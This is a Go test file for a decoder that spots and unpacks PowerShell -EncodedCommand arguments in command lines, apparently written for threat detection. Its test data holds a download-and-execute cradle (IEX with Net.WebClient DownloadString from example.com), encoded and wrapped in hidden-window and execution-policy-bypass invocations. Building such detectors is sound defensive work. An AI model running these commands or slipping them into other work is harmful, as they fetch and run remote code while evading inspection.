package cmdline

import (
	"encoding/base64"
	"testing"
	"unicode/utf16"
)

// encode turns commands into the form PowerShell's -EncodedCommand takes.
func encode(commands string) string {
	units := utf16.Encode([]rune(commands))
	raw := make([]byte, 2*len(units))
	for i, unit := range units {
		raw[2*i], raw[2*i+1] = byte(unit), byte(unit>>8)
	}
	return base64.StdEncoding.EncodeToString(raw)
}

func TestEncodedCommand(t *testing.T) {
	const commands = "IEX (New-Object Net.WebClient).DownloadString('https://example.com/a.ps1')\r\nWrite-Host 'done'"
	hidden := encode(commands)
	for _, test := range []struct {
		line string
		want string
	}{
		{`powershell.exe -NoP -W Hidden -Enc ` + hidden, commands},
		{`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand ` + hidden, commands},
		{`powershell -e ` + hidden, commands},
		{`powershell -ec ` + hidden, commands},
		{`pwsh /encodedcommand "` + hidden + `"`, commands},
		{`cmd.exe /c powershell -nop -enc ` + hidden, commands},
		// Without its padding at the end.
		{`powershell -enc ` + encode("Get-Date"), "Get-Date"},
		{`powershell -enc ` + trimPadding(encode("Get-Date")), "Get-Date"},

		// Not encoded commands.
		{`powershell -ExecutionPolicy Bypass -File C:\a\b.ps1`, ""},
		{`powershell -ex Bypass -Command Get-Date`, ""},
		{`powershell -enc`, ""},
		{`powershell -enc not*base64*at*all`, ""},
		{`notepad.exe -enc ` + hidden, ""},
		{`powershell`, ""},
		{``, ""},
		// Letters and digits that decode, but not into text.
		{`powershell -enc AAECAwQFBgcICQoLDA0ODw==`, ""},
	} {
		got, ok := EncodedCommand(test.line)
		if got != test.want || ok != (test.want != "") {
			t.Errorf("EncodedCommand(%q) = %q, %v; want %q", test.line, got, ok, test.want)
		}
	}
}

func trimPadding(text string) string {
	for len(text) > 0 && text[len(text)-1] == '=' {
		text = text[:len(text)-1]
	}
	return text
}

func TestEncoded(t *testing.T) {
	hidden := encode("Start-Process calc.exe")
	for line, want := range map[string]bool{
		`powershell -enc ` + hidden:                 true,
		`powershell -e ` + hidden:                   true,
		`powershell -EncodedCommand ` + hidden:      true,
		`powershell -ec ` + hidden:                  true,
		`powershell -ExecutionPolicy Bypass`:        false,
		`powershell -ex RemoteSignedRemoteSigned`:   false,
		`powershell -e Bypass`:                      false, // too short to be commands
		`powershell -enc "has spaces and symbols!"`: false,
		`powershell -Command Get-Date`:              false,
	} {
		if got := Encoded(line); got != want {
			t.Errorf("Encoded(%q) = %v", line, got)
		}
	}
}
